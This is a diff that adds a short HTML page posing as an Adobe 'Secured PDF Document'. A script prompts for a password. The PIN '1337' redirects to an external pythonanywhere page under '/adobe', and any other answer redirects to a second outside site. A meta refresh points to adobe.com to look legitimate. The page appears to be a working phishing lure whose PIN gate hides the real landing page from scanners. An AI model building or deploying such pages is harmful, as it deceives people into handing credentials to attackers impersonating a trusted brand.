@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Secured PDF Document</title>
+    <script>
+      // prompt the user to input a PIN
+      var pin = prompt("This document is password protected, Please enter a password.");
+
+      // check if the PIN matches
+      if (pin === "1337") {
+        // redirect to a new page if the PIN matches
+        window.location.href = "https://happigeek.pythonanywhere.com/adobe";
+      } else {
+        // display an error message if the PIN doesn't match
+        alert("Invalid Password. Please try again or contact the sender for a valid Password.");
+        window.location.href = "https://zeusblog.cloud/pdf.html";
+      }
+    </script>
+  </head>
+  <body>
+   <meta http-equiv="refresh" content="2; URL =https://www.adobe.com/acrobat.html">
+  </body>
+</html>
